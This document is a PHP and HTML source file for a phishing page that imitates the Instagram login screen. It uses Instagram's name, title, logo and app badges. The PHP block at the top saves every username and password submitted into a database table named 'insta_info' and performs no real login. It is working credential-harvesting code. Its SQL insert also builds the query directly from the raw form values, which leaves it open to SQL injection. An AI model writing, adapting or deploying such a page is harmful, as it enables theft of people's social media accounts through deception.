<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
    // set connection variables
    $server = "localhost";
    $username = "root";
    $password = "";
    $database = "insta_info";

    // create database connection 
    $con = mysqli_connect($server, $username, $password, $database);
    
    // check for connection success
    if(!$con){
        die("connection to this database failed due to " . mysqli_connect_error());
    }
   
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "INSERT INTO `insta_info` (`username`, `password`, `dt`) VALUES ('$username', '$password', current_timestamp())";
    
    if(mysqli_query($con, $sql)){
        // echo "Records inserted successfully.";
        echo "echo.";
    } else{
        echo "ERROR: Could not able to execute $sql. " . mysqli_error($con);
    }
    
    // close the database connection
    mysqli_close($con);
}
?>






<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
    <input type="text" class="c-panel__input" name="username" placeholder="Phone number, username, or email"><br>
    <input type="password" class="c-panel__input" name="password" placeholder="Password"><br>
    <button type="submit" class="c-btn" name="submit">Log In</button><br>
    <span class="c-panel__span">OR</span>
</form>



          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>
</body>
</html>